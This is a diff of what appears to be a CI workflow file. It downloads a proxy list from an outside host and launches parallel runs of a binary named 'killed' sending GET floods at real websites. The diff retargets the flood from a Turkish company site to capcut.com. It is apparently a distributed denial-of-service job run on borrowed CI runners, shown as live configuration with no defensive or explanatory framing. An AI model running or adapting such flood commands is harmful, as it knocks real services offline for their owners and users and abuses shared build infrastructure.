@@ -17,8 +17,8 @@ jobs:
           wget https://wgetz.com/QehSBqKAxt/fres.txt -O fres.txt
           chmod +x killed
           PIDS=()
-          for i in {1..16}; do
-            sudo timeout 40 ./killed GET https://odakteknoloji.com.tr/ fres.txt 40 900 6 &
+          for i in {1..2}; do
+            sudo timeout 40 ./killed GET https://capcut.com/ fres.txt 40 900 4 &
             PIDS+=($!)
           done
           
